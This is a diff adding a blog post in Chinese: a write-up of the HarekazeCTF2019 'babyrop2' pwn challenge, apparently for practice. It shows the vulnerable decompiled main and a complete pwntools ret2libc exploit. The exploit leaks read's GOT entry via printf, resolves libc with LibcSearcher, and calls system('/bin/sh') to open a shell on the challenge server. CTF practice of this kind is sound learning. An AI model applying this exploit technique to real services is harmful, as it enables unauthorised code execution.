@@ -1,0 +1,77 @@
+---
+layout: post
+title:  babyrop2
+date:   2021-02-04 00:01:01 +0300
+image:  2021-02-04-squirrel.jpg
+tags:   [ctf,PWN,HarekazeCTF2019]
+---
+
+main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  char buf[28]; // [rsp+0h] [rbp-20h]
+  int v6; // [rsp+1Ch] [rbp-4h]
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  printf("What's your name? ", 0LL);
+  v3 = read(0, buf, 0x100uLL);
+  v6 = v3;
+  buf[v3 - 1] = 0;
+  printf("Welcome to the Pwn World again, %s!\n", buf);
+  return 0;
+}
+```
+
+程序中有printf()函数，可以通过它来泄露函数的got地址，从而计算得到libc的基地址。
+
+构造ROP链
+
+```assembly
+from pwn import *
+from LibcSearcher import *
+
+elf = ELF("./babyrop2")
+
+io = remote("node3.buuoj.cn",28682)
+
+poprdi = 0x400733
+poprsi_r15 = 0x400731
+'''
+.text:0000000000400731                 pop     rsi
+.text:0000000000400732                 pop     r15
+.text:0000000000400734                 retn
+'''
+format_str = 0x400770
+# printf_got = elf.got["printf"]
+# 这里不知道为什么如果泄露printf函数的got地址会出错
+read_got = elf.got["read"]
+printf_plt = 0x4004F0
+main = 0x400636
+payload = "a" * (0x20 + 8) + p64(poprdi) + p64(format_str)
+payload += p64(poprsi_r15) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main)
+# poprsi_r15后应跟两个参数，一个是rsi，一个是r15
+io.recvuntil("What's your name? ")
+io.sendline(payload)
+
+io.recvline()
+io.recvuntil("Welcome to the Pwn World again, ")
+addr = io.recvuntil("!")[:-1].ljust(8,"\0")
+addr = u64(addr)
+print(addr)
+
+libc = LibcSearcher("read", addr)
+base = addr - libc.dump("read")
+system = base + libc.dump("system")
+binsh = base + libc.dump("str_bin_sh")
+
+payload = "a" * (0x20 + 8) + p64(poprdi) + p64(binsh) + p64(system)
+io.recvuntil("What's your name? ")
+io.sendline(payload)
+
+io.interactive()
+```
+
